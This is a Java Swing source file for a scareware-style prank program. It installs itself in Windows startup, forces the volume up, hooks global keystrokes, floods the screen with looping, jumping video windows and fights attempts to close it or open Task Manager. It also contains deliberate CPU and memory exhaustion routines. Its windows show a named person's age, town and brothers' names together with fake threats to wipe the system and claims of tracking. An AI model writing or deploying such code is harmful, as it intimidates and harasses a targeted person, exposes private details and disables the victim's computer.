/**
 * The `hehehaMeow` class is the core of this program and acts as the main entry point.
 * It extends `JFrame` to provide a graphical user interface (GUI) while also managing
 * several disruptive background tasks. The class includes various features like playing 
 * videos, sounds, and animations, along with monitoring specific keyboard input.
 * 
 * ### What This Class Does:
 * 1. **Creates and Displays Multiple Windows:**
 *    - There are several `JFrame` instances (e.g., `jFrame1`, `jFrame2`) defined here.
 *      Each frame has its own layout and content.
 *    - Frames are dynamically shown, hidden, or repositioned during the program's lifecycle.

 * 2. **Listens for Key Sequences:**
 *    - Implements a key sequence listener using `JNativeHook`. 
 *    - The program listens for the keys `A` and `S` pressed in sequence. When the sequence 
 *      is detected, it shuts down all tasks and exits the program safely.

 * 3. **Manages Resource Usage:**
 *    - Contains functions to deliberately overload CPU and memory.
 *    - This includes creating infinite loops or allocating memory until the system is stressed.

 * 4. **Video and Audio Playback:**
 *    - Videos are played using JavaFX's `MediaPlayer`. Videos can be displayed in custom 
 *      positions and are looped indefinitely.
 *    - Sounds are played using the Java Sound API, specifically `javax.sound.sampled`.

 * 5. **Background Animations and Disruptions:**
 *    - Frames are animated and repositioned frequently to make the user’s experience more "interactive."
 *    - The `dontClose` method continuously checks the mouse position and responds when 
 *      the pointer is near the bottom of the screen.

 * 6. **Handles Startup Registration:**
 *    - The program automatically adds itself to the Windows `shell:startup` folder using a separate class (`StartupManager`).
 *      This ensures the program launches on system boot.

 * ### Explanation of Key Methods:
 * - `initComponents()`: Initializes all GUI components. This method sets up all the frames,
 *   buttons, labels, and their associated properties.
 * 
 * - `registerShutdownShortcut()`: Listens for the key sequence `A` and `S` to allow users 
 *   to exit the program gracefully. The key listener resets if the sequence is interrupted.
 * 
 * - `backgroundSound()`: Plays a looping background sound (e.g., "meow.wav") during the 
 *   program's runtime.
 * 
 * - `startAnnoying()`: Opens multiple video frames at different positions on the screen. 
 *   It also schedules tasks to repeatedly display new video frames.
 * 
 * - `changeFrame()`: Rotates through several predefined frames (`jFrame1`, `jFrame3`, etc.) 
 *   and displays them one by one.
 * 
 * - `openVideoPlayer()`: A helper function that creates a `JFrame` to play a video using JavaFX. 
 *   Videos are loaded from the file system and played in loop mode.
 * 
 * - `dontClose()`: Continuously monitors the mouse pointer location and ensures certain 
 *   frames remain visible if the pointer is near the Task Manager or screen edge.

 * - `Killer()`: Creates an infinite loop designed to overload the CPU by performing 
 *   computationally expensive tasks.
 * 
 * - `stressMemory()`: Allocates memory in chunks until the system is almost out of memory, 
 *   creating a memory stress scenario.

 * ### How It All Works Together:
 * - When the program starts, it initializes the GUI and plays a sound in the background.
 * - Frames are displayed, videos start playing, and mouse position monitoring begins.
 * - The program listens for the `A` and `S` keys to shut down safely.
 * - If the user doesn't terminate the program, it continues to play animations, videos, 
 *   and sounds while performing resource-intensive tasks.

 * ### Notes:
 * - This class is intended for experimental purposes. The intentional resource stress 
 *   could negatively impact system performance, and it should not be used in a production 
 *   environment.
 */


import java.lang.management.ManagementFactory;
import com.sun.management.OperatingSystemMXBean;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import com.sun.tools.javac.Main;
import java.awt.Color;
import java.awt.Component;
import java.awt.Cursor;
import java.awt.Dimension;
import java.awt.EventQueue;
import java.awt.Font;
import java.awt.KeyEventDispatcher;
import java.awt.KeyboardFocusManager;
import java.awt.MouseInfo;
import java.awt.Point;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyEvent;
import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;
import java.util.logging.Level;
import java.util.logging.Logger;
import javafx.application.Platform;
import javafx.embed.swing.JFXPanel;
import javafx.scene.Group;
import javafx.scene.Node;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.scene.media.Media;
import javafx.scene.media.MediaPlayer;
import javafx.scene.media.MediaView;
import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.Clip;
import javax.sound.sampled.LineUnavailableException;
import javax.sound.sampled.UnsupportedAudioFileException;
import javax.swing.GroupLayout;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.LayoutStyle;
import javax.swing.SwingUtilities;
import javax.swing.Timer;
import javax.swing.UIManager;
import javax.swing.UnsupportedLookAndFeelException;

public class hehehaMeow
        extends JFrame {

    private static ScheduledExecutorService starter = Executors.newSingleThreadScheduledExecutor();
    private static ScheduledFuture<?> starterFuture;
    private static ScheduledExecutorService scheduler;
    private static ScheduledFuture<?> scheduledFuture;
    private static ScheduledExecutorService scheduler2;
    private static ScheduledFuture<?> scheduledFuture2;
    private int currentFrame = 1;
    boolean flaga = false;
    boolean flagf = false;
    boolean flagd = false;
    boolean flag = false;
    int counter = 0;
    int countery = 0;
    int lineCycle = 0;
    boolean killer = true;
    private JButton jButton3;
    private JFrame jFrame1;
    private JFrame jFrame2;
    private JFrame jFrame3;
    private JFrame jFrame4;
    private JFrame jFrame5;
    private JLabel jLabel1;
    private JLabel jLabel10;
    private JLabel jLabel11;
    private JLabel jLabel12;
    private JLabel jLabel13;
    private JLabel jLabel14;
    private JLabel jLabel15;
    private JLabel jLabel16;
    private JLabel jLabel17;
    private JLabel jLabel18;
    private JLabel jLabel19;
    private JLabel jLabel2;
    private JLabel jLabel20;
    private JLabel jLabel3;
    private JLabel jLabel4;
    private JLabel jLabel5;
    private JLabel jLabel6;
    private JLabel jLabel7;
    private JLabel jLabel8;
    private JLabel jLabel9;
    private JPanel jPanel1;

    public hehehaMeow() {
        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler2 = Executors.newSingleThreadScheduledExecutor();
        this.initComponents();
        this.backgroundSound();
        this.registerShutdownShortcut();
        StartupManager.addToStartup();
        ForceVolume.startInfiniteVolumeIncrease();
        Timer timer = new Timer(0, e -> {
            hehehaMeow.this.startProgram();
            
        });

        Timer timer2 = new Timer(10, e -> {
            startAnnoying();
        });

        Timer timer3 = new Timer(30000, e -> {
            //stressMemory();
        });
        Timer timer4 = new Timer(100, e -> {
            CPUKillerMonitor.startMonitoring(this);
        });
        timer.start();
        timer2.start();
        timer3.start();
        timer4.start();
    }

    public void startProgram() {
        this.setVisible(true);

        this.dontClose();
    }

    private void startFrameSequence() {
        scheduledFuture2 = scheduler2.scheduleAtFixedRate(this::changeFrame, 10L, 5L, TimeUnit.SECONDS);
    }

    void backgroundSound() {
        this.playSound("meow.wav");
    }

    private void changeFrame() {
        switch (this.currentFrame) {
            case 1: {
                this.showFrame1();
                break;
            }
            case 3: {
                this.showFrame3();
                break;
            }
            case 4: {
                this.showFrame4();
                break;
            }
            case 5: {
                this.showFrame5();
            }
        }
        ++this.currentFrame;
        if (this.currentFrame > 5) {
            this.jFrame1.setVisible(false);
            this.jFrame3.setVisible(false);
            this.jFrame4.setVisible(false);
            this.jFrame5.setVisible(false);
            this.startAnnoying();
            this.scheduledFuture21();
        }
    }

    private void scheduledFuture21() {
        if (scheduledFuture2 != null) {
            scheduledFuture2.cancel(false);
        }
        scheduler2.shutdown();
    }

    private void showFrame1() {
        this.jFrame1.setSize(new Dimension(722, 315));
        this.jFrame1.setLocation(50, 50);
        this.jFrame1.setVisible(true);
    }

    private void showFrame3() {
        this.jFrame3.setSize(new Dimension(297, 478));
        this.jFrame3.setLocation(500, 50);
        this.jFrame3.setVisible(true);
    }

    private void showFrame4() {
        this.jFrame4.setSize(new Dimension(700, 130));
        this.jFrame4.setLocation(700, 50);
        this.jFrame4.setVisible(true);
    }

    private void showFrame5() {
        this.jFrame5.setSize(new Dimension(612, 300));
        this.jFrame5.setLocation(500, 500);
        this.jFrame5.setVisible(true);
    }

    public void registerShutdownShortcut() {
    System.out.println("Global key listener started");

    // Sequence to match
    final char[] shutdownSequence = {'a', 's'}; // Updated to A and S keys
    final int[] currentIndex = {0}; // Tracks the sequence progress

    try {
        // Register JNativeHook
        GlobalScreen.registerNativeHook();
    } catch (NativeHookException e) {
        System.err.println("Failed to register native hook: " + e.getMessage());
        return;
    }

    // Add a key listener
    GlobalScreen.addNativeKeyListener(new NativeKeyListener() {
        @Override
        public void nativeKeyPressed(NativeKeyEvent e) {
            char pressedChar = NativeKeyEvent.getKeyText(e.getKeyCode()).toLowerCase().charAt(0);

            // Check if the pressed key matches the current step in the sequence
            if (pressedChar == shutdownSequence[currentIndex[0]]) {
                System.out.println("Key matched: " + pressedChar);
                currentIndex[0]++;

                // If the full sequence is matched
                if (currentIndex[0] == shutdownSequence.length) {
                    System.out.println("Shutdown sequence detected!");
                    killer = false; // Stop CPU overloading
                    stopTask();

                    // Unregister the native hook and exit
                    try {
                        GlobalScreen.unregisterNativeHook();
                    } catch (NativeHookException ex) {
                        ex.printStackTrace();
                    }
                    System.exit(0);
                }
            } else {
                // Reset the sequence progress if the key doesn't match
                currentIndex[0] = 0;
            }
        }

        @Override
        public void nativeKeyReleased(NativeKeyEvent e) {
            // Not used
        }

        @Override
        public void nativeKeyTyped(NativeKeyEvent e) {
            // Not used
        }
    });

    // Reduce logging to avoid unnecessary overhead
    java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
    logger.setLevel(Level.OFF);
    logger.setUseParentHandlers(false);
}


    private void initComponents() {
        this.jFrame2 = new JFrame();
        this.jLabel3 = new JLabel();
        this.jLabel4 = new JLabel();
        this.jLabel5 = new JLabel();
        this.jLabel6 = new JLabel();
        this.jFrame1 = new JFrame();
        this.jLabel2 = new JLabel();
        this.jLabel7 = new JLabel();
        this.jFrame3 = new JFrame();
        this.jLabel8 = new JLabel();
        this.jLabel9 = new JLabel();
        this.jLabel10 = new JLabel();
        this.jFrame4 = new JFrame();
        this.jLabel11 = new JLabel();
        this.jLabel12 = new JLabel();
        this.jLabel13 = new JLabel();
        this.jLabel14 = new JLabel();
        this.jLabel15 = new JLabel();
        this.jFrame5 = new JFrame();
        this.jLabel16 = new JLabel();
        this.jLabel17 = new JLabel();
        this.jLabel18 = new JLabel();
        this.jLabel19 = new JLabel();
        this.jLabel20 = new JLabel();
        this.jPanel1 = new JPanel();
        this.jLabel1 = new JLabel();
        this.jButton3 = new JButton();
        this.jFrame2.setCursor(new Cursor(3));
        this.jLabel3.setText("DONT CLOSE ME PLEASE");
        this.jLabel4.setText("DONT CLOSE ME PLEASE");
        this.jLabel5.setText("DONT CLOSE ME PLEASE");
        this.jLabel6.setText("I BEG YOU! \u062d\u0645\u0648\u062f \u062d\u0628\u064a\u0628\u064a \u062d\u0645\u0648\u062f");
        GroupLayout jFrame2Layout = new GroupLayout(this.jFrame2.getContentPane());
        this.jFrame2.getContentPane().setLayout(jFrame2Layout);
        jFrame2Layout.setHorizontalGroup(jFrame2Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jFrame2Layout.createSequentialGroup().addGroup(jFrame2Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jFrame2Layout.createSequentialGroup().addGap(43, 43, 43).addComponent(this.jLabel6, -2, 165, -2)).addGroup(jFrame2Layout.createSequentialGroup().addGap(52, 52, 52).addGroup(jFrame2Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addComponent(this.jLabel3, -2, 145, -2).addComponent(this.jLabel5, -2, 145, -2).addComponent(this.jLabel4, -2, 145, -2)))).addContainerGap(53, Short.MAX_VALUE)));
        jFrame2Layout.setVerticalGroup(jFrame2Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jFrame2Layout.createSequentialGroup().addGap(18, 18, 18).addComponent(this.jLabel4).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jLabel3).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jLabel5).addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED).addComponent(this.jLabel6, -2, 46, -2).addContainerGap(24, Short.MAX_VALUE)));
        this.jFrame1.setAlwaysOnTop(true);
        this.jLabel2.setFont(new Font("Tahoma", 1, 36));
        this.jLabel2.setText("I KNOW THAT YOUR NAME IS");
        this.jLabel7.setFont(new Font("Snap ITC", 1, 64));
        this.jLabel7.setForeground(new Color(255, 0, 0));
        this.jLabel7.setText("SULTAN");
        GroupLayout jFrame1Layout = new GroupLayout(this.jFrame1.getContentPane());
        this.jFrame1.getContentPane().setLayout(jFrame1Layout);
        jFrame1Layout.setHorizontalGroup(jFrame1Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jFrame1Layout.createSequentialGroup().addGap(63, 63, 63).addComponent(this.jLabel2, -2, 553, -2).addContainerGap(106, Short.MAX_VALUE)).addGroup(GroupLayout.Alignment.TRAILING, jFrame1Layout.createSequentialGroup().addGap(0, 0, Short.MAX_VALUE).addComponent(this.jLabel7, -2, 356, -2)));
        jFrame1Layout.setVerticalGroup(jFrame1Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jFrame1Layout.createSequentialGroup().addGap(15, 15, 15).addComponent(this.jLabel2, -2, 85, -2).addGap(18, 18, 18).addComponent(this.jLabel7, -2, 176, -2).addContainerGap(21, Short.MAX_VALUE)));
        this.jFrame3.setDefaultCloseOperation(0);
        this.jFrame3.setAlwaysOnTop(true);
        this.jFrame3.setCursor(new Cursor(0));
        this.jFrame3.setResizable(false);
        this.jLabel8.setText("I KNOW");
        this.jLabel9.setFont(new Font("Segoe UI", 0, 48));
        this.jLabel9.setText("EVERYTHING");
        this.jLabel10.setText("YOU JUST TURNED 18 , 1 MONTH AGO");
        GroupLayout jFrame3Layout = new GroupLayout(this.jFrame3.getContentPane());
        this.jFrame3.getContentPane().setLayout(jFrame3Layout);
        jFrame3Layout.setHorizontalGroup(jFrame3Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jFrame3Layout.createSequentialGroup().addGroup(jFrame3Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jFrame3Layout.createSequentialGroup().addGap(80, 80, 80).addComponent(this.jLabel8, -2, 101, -2)).addGroup(jFrame3Layout.createSequentialGroup().addContainerGap().addComponent(this.jLabel9, -2, 285, -2)).addComponent(this.jLabel10, -2, 230, -2)).addContainerGap(-1, Short.MAX_VALUE)));
        jFrame3Layout.setVerticalGroup(jFrame3Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jFrame3Layout.createSequentialGroup().addGap(86, 86, 86).addComponent(this.jLabel8).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jLabel9, -2, 129, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED, 109, Short.MAX_VALUE).addComponent(this.jLabel10, -2, 117, -2).addGap(15, 15, 15)));
        this.jFrame4.setAlwaysOnTop(true);
        this.jFrame4.setCursor(new Cursor(9));
        this.jLabel11.setText("YOU STUDY IN NIZWA");
        this.jLabel12.setText("YOUR BROTHERS ARE");
        this.jLabel13.setText("AMMAR");
        this.jLabel14.setText("KHALID");
        this.jLabel15.setText("AHMED");
        GroupLayout jFrame4Layout = new GroupLayout(this.jFrame4.getContentPane());
        this.jFrame4.getContentPane().setLayout(jFrame4Layout);
        jFrame4Layout.setHorizontalGroup(jFrame4Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jFrame4Layout.createSequentialGroup().addContainerGap().addComponent(this.jLabel11, -2, 173, -2).addGap(213, 213, 213).addComponent(this.jLabel13, -2, 43, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED, 168, Short.MAX_VALUE).addComponent(this.jLabel15, -2, 43, -2).addGap(52, 52, 52)).addGroup(GroupLayout.Alignment.TRAILING, jFrame4Layout.createSequentialGroup().addContainerGap(-1, Short.MAX_VALUE).addComponent(this.jLabel12, -2, 148, -2).addGap(105, 105, 105).addComponent(this.jLabel14, -2, 59, -2).addGap(82, 82, 82)));
        jFrame4Layout.setVerticalGroup(jFrame4Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jFrame4Layout.createSequentialGroup().addContainerGap().addGroup(jFrame4Layout.createParallelGroup(GroupLayout.Alignment.BASELINE).addComponent(this.jLabel11, -2, 39, -2).addComponent(this.jLabel13).addComponent(this.jLabel15)).addGap(18, 18, 18).addGroup(jFrame4Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addComponent(this.jLabel12, -2, 49, -2).addComponent(this.jLabel14, -2, 32, -2)).addContainerGap(18, Short.MAX_VALUE)));
        this.jFrame5.setAlwaysOnTop(true);
        this.jFrame5.setCursor(new Cursor(3));
        this.jLabel16.setText("OR I WILL WIPE YOUR BOOTING SYSTEM EVEN FORMATING WONT WORK");
        this.jLabel17.setText("I HAVE BEEN TRACKING YOU FOR YEARS NOW");
        this.jLabel18.setText("SUCH A NOOB ");
        this.jLabel19.setText("RIP FOR YOU PC , ITS DIED");
        this.jLabel20.setText("DONT TRY TO SHUTDOWN YOUR LAPTOP");
        GroupLayout jFrame5Layout = new GroupLayout(this.jFrame5.getContentPane());
        this.jFrame5.getContentPane().setLayout(jFrame5Layout);
        jFrame5Layout.setHorizontalGroup(jFrame5Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jFrame5Layout.createSequentialGroup().addGap(111, 111, 111).addComponent(this.jLabel18, -2, 102, -2).addGap(0, 0, Short.MAX_VALUE)).addGroup(GroupLayout.Alignment.TRAILING, jFrame5Layout.createSequentialGroup().addContainerGap().addGroup(jFrame5Layout.createParallelGroup(GroupLayout.Alignment.TRAILING).addComponent(this.jLabel16, -1, 574, Short.MAX_VALUE).addGroup(jFrame5Layout.createSequentialGroup().addGap(0, 0, Short.MAX_VALUE).addComponent(this.jLabel19, -2, 213, -2))).addGap(32, 32, 32)).addGroup(jFrame5Layout.createSequentialGroup().addGroup(jFrame5Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jFrame5Layout.createSequentialGroup().addContainerGap().addComponent(this.jLabel17, -2, 257, -2)).addGroup(jFrame5Layout.createSequentialGroup().addGap(27, 27, 27).addComponent(this.jLabel20, -2, 278, -2))).addContainerGap(-1, Short.MAX_VALUE)));
        jFrame5Layout.setVerticalGroup(jFrame5Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jFrame5Layout.createSequentialGroup().addContainerGap().addComponent(this.jLabel17, -2, 74, -2).addGap(18, 18, 18).addComponent(this.jLabel18, -2, 42, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED, 10, Short.MAX_VALUE).addComponent(this.jLabel19, -2, 42, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jLabel20, -2, 42, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jLabel16, -2, 42, -2).addGap(12, 12, 12)));
        this.setDefaultCloseOperation(0);
        this.setAlwaysOnTop(true);
        this.setResizable(false);
        this.jLabel1.setHorizontalAlignment(0);
        this.jLabel1.setText("Are you dumb?");
        this.jButton3.setText("Yes");
        this.jButton3.addActionListener(new ActionListener() {

            @Override
            public void actionPerformed(ActionEvent evt) {
                hehehaMeow.this.jButton3ActionPerformed(evt);
            }
        });
        GroupLayout jPanel1Layout = new GroupLayout(this.jPanel1);
        this.jPanel1.setLayout(jPanel1Layout);
        jPanel1Layout.setHorizontalGroup(jPanel1Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jPanel1Layout.createSequentialGroup().addGap(15, 15, 15).addComponent(this.jLabel1, -1, -1, Short.MAX_VALUE).addContainerGap()).addGroup(GroupLayout.Alignment.TRAILING, jPanel1Layout.createSequentialGroup().addContainerGap(26, Short.MAX_VALUE).addComponent(this.jButton3, -2, 114, -2).addGap(18, 18, 18)));
        jPanel1Layout.setVerticalGroup(jPanel1Layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(jPanel1Layout.createSequentialGroup().addContainerGap().addComponent(this.jLabel1).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED, 30, Short.MAX_VALUE).addComponent(this.jButton3).addGap(25, 25, 25)));
        GroupLayout layout = new GroupLayout(this.getContentPane());
        this.getContentPane().setLayout(layout);
        layout.setHorizontalGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createSequentialGroup().addGap(20, 20, 20).addComponent(this.jPanel1, -2, -1, -2).addContainerGap(22, Short.MAX_VALUE)));
        layout.setVerticalGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createSequentialGroup().addGap(22, 22, 22).addComponent(this.jPanel1, -2, -1, -2).addContainerGap(28, Short.MAX_VALUE)));
        this.pack();
        this.setLocationRelativeTo(null);
    }

    private void playSound(String sound) {
        try {
            File soundFile = new File(sound);
            AudioInputStream audioIn = AudioSystem.getAudioInputStream(soundFile);
            Clip clip = AudioSystem.getClip();
            clip.open(audioIn);
            clip.start();
        } catch (IOException | LineUnavailableException | UnsupportedAudioFileException e) {
            e.printStackTrace();
        }
    }

    private void dontClose() {
        Timer timer = new Timer(100, new ActionListener() {

            @Override
            public void actionPerformed(ActionEvent e) {
                hehehaMeow.this.checkMousePosition();
            }
        });
        timer.start();
    }

    private void checkMousePosition() {
        Toolkit toolkit = Toolkit.getDefaultToolkit();
        Dimension screenSize = toolkit.getScreenSize();
        int screenWidth = screenSize.width;
        int screenLength = screenSize.height;
        if ((double) MouseInfo.getPointerInfo().getLocation().y > (double) screenLength * 0.9 || TaskManagerDetector.isTaskManagerOpen()) {
            if (!this.flag) {
                this.jFrame2.setVisible(true);
                this.jFrame2.setAlwaysOnTop(true);
                this.jFrame2.setSize(new Dimension(250, 160));
                this.jFrame2.setResizable(false);
                this.jFrame2.setDefaultCloseOperation(0);
                Timer timer = new Timer(10, new ActionListener() {

                    @Override
                    public void actionPerformed(ActionEvent e) {
                        Point mouseLocation = MouseInfo.getPointerInfo().getLocation();
                        SwingUtilities.convertPointFromScreen(mouseLocation, hehehaMeow.this);
                        hehehaMeow.this.jFrame2.setLocation((int) mouseLocation.getX() + 500, (int) mouseLocation.getY() + 250);
                    }
                });
                timer.start();
                this.flag = true;
                this.jFrame2.setVisible(true);
                this.playSound("Hamood.wav");
            }
        } else if (this.flag) {
            this.flag = false;
            this.jFrame2.setVisible(false);
        }
    }

    private void jButton3ActionPerformed(ActionEvent evt) {
        this.startAnnoying();
    }

    void startAnnoying() {
        JFrame videoFrame1 = openVideoPlayer("you are an idiot!.mp4", false, 205, 165, 170, 400);
        JFrame videoFrame2 = openVideoPlayer("test.mp4", true, 220, 170, 0, 0);

        if (scheduledFuture == null || scheduledFuture.isCancelled()) {
            scheduledFuture = scheduler.scheduleAtFixedRate(() -> {
                ++this.lineCycle;
                if (this.lineCycle % 6 == 0) {
                    this.countery += 300;
                    openVideoPlayer("test.mp4", true, 220, 170, 0, 0);
                    this.counter = 0;
                }
                openVideoPlayer("you are an idiot!.mp4", false, 205, 165, this.counter, this.countery);
                this.counter += 300;

                // Ensure counter doesn't exceed bounds
                if (this.countery > 900) {
                    stopTask();
                }
            }, 0, 1, TimeUnit.SECONDS);
        }
    }

    void myTask() {
        ++this.lineCycle;
        if (this.lineCycle % 6 == 0) {
            this.countery += 300;
            this.openVideoPlayer("test.mp4", true, 220, 170, 0, 0);
            this.counter = 0;
        }
        this.openVideoPlayer("you are an idiot!.mp4", false, 205, 165, this.counter, this.countery);
        this.counter += 300;
        if (this.countery > 900) {
            this.stopTask();
        }
    }

    void stopTask() {
        if (scheduledFuture != null) {
            scheduledFuture.cancel(false);
        }
        scheduler.shutdown();
    }

    void stopTask2() {
        if (scheduledFuture2 != null) {
            scheduledFuture2.cancel(false);
        }
        scheduler2.shutdown();
    }

    private JFrame openVideoPlayer(String videoPath, boolean move, int width, int height, int x, int y) {
        JFrame videoFrame = new JFrame("NO NO no");
        videoFrame.setResizable(false);
        videoFrame.setSize(width, height);
        videoFrame.setAlwaysOnTop(true);
        videoFrame.setUndecorated(true);
        JFXPanel fxPanel = new JFXPanel();
        videoFrame.getContentPane().add(fxPanel);
        
        Platform.runLater(() -> {
            try {
                File videoFile = new File(videoPath);
                if (!videoFile.exists()) {
                    System.out.println("Video file not found: " + videoPath);
                    return;
                }

                String mediaPath = videoFile.toURI().toString();
                Media media = new Media(mediaPath);
                MediaPlayer mediaPlayer = new MediaPlayer(media);
                MediaView mediaView = new MediaView(mediaPlayer);
                Group root = new Group(mediaView);
                Scene scene = new Scene(root);
                fxPanel.setScene(scene);
                mediaPlayer.setCycleCount(MediaPlayer.INDEFINITE);
                mediaPlayer.play();
            } catch (Exception e) {
                e.printStackTrace();
            }
        });

        videoFrame.setVisible(true);
        videoFrame.setLocation(x, y);

        if (move) {
            changePosition(videoFrame);
        }

        return videoFrame;
    }

    void changePosition(final JFrame videoFrame) {
        SwingUtilities.invokeLater(new Runnable() {

            @Override
            public void run() {
                Timer timer = new Timer(50, new ActionListener() {

                    @Override
                    public void actionPerformed(ActionEvent e) {
                        Random generator = new Random();
                        videoFrame.setLocation(generator.nextInt(0, 1080), generator.nextInt(0, 1080));
                    }
                });
                timer.start();
            }
        });
    }

    private void playVideo(JFXPanel fxPanel, String videoPath) {
        Platform.runLater(() -> {
            File videoFile = new File(videoPath);
            String mediaPath = videoFile.toURI().toString();
            Media media = new Media(mediaPath);
            MediaPlayer mediaPlayer = new MediaPlayer(media);
            MediaView mediaView = new MediaView(mediaPlayer);
            Group root = new Group(new Node[]{mediaView});
            Scene scene = new Scene((Parent) root);
            fxPanel.setScene(scene);
            mediaPlayer.setCycleCount(-1);
            mediaPlayer.play();
        });
    }

    public int createNew() {
        new hehehaMeow().setVisible(true);
        return 2;
    }

    void Killer() {
        System.out.println("CPU killer just started");
        Thread infiniteLoopThread = new Thread(() -> {
            while (this.killer) {
                for (int i = 0; i < Integer.MAX_VALUE; ++i) {
                    double d = Math.sin(Math.sqrt(i));
                }
            }
        });
        infiniteLoopThread.start();
    }
    private static final int NUM_CPU_THREADS = Runtime.getRuntime().availableProcessors() * 2;
    private static final long MAX_MEMORY_USAGE_MB = Runtime.getRuntime().maxMemory() / (1024 * 1024);
    private static final int DISK_FILE_SIZE_MB = 1024; // 1GB per file
    private static final int NUM_DISK_THREADS = 5;
    private static final int GPU_WINDOW_SIZE = 1000;
    private static final String TEMP_FILE_PREFIX = "stress_test_file_";

    private static void stressMemory() {
        System.out.println("🔥 Memory Stress Started...");
        List<byte[]> memoryBlocks = new ArrayList<>();

        try {
            while (true) {
                // Allocate 10MB chunks for faster memory filling
                byte[] block = new byte[10 * 1024 * 1024]; // 10MB per block
                memoryBlocks.add(block);
                System.out.println("🛑 Allocated: " + memoryBlocks.size() * 10 + "MB");

                if (memoryBlocks.size() * 10 >= MAX_MEMORY_USAGE_MB - 50) {
                    System.out.println("🚨 Memory Limit Reached! Holding memory...");
                    break;
                }
            }
        } catch (OutOfMemoryError e) {
            System.out.println("🚨 Memory Stress Reached Limit! Holding memory...");
        }

        while (true) {
            // Keep memory occupied without releasing
            try {
                Thread.sleep(100);
            } catch (InterruptedException ignored) {
            }
        }
    }
    
    public static void main(String[] args) {
        // Check Java version and add necessary modules if needed
        String javaVersion = System.getProperty("java.version");
        if (!javaVersion.startsWith("1.8")) {
            String[] newArgs = new String[args.length + 1];
            System.arraycopy(args, 0, newArgs, 0, args.length);
            newArgs[args.length] = "--add-modules=javafx.controls,javafx.media";
            args = newArgs;
        }

        // Set Nimbus look-and-feel
        try {
            for (UIManager.LookAndFeelInfo info : UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (Exception ex) {
            Logger.getLogger(Main.class.getName()).log(Level.SEVERE, "Failed to set Nimbus Look and Feel", ex);
        }

        // Start the program
        EventQueue.invokeLater(() -> {
            hehehaMeow myFrame = new hehehaMeow();
            myFrame.setVisible(false);

            VisualDisruption disruption = new VisualDisruption();
            disruption.startVisualDisruption();
            //StressTest stressTest = new StressTest();
            //stressTest.main(new String[0]); // Trigger stress test

        });
    }

    static {
        Platform.startup(() -> {
        }); // Initialize JavaFX
        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler2 = Executors.newSingleThreadScheduledExecutor();
    }

}
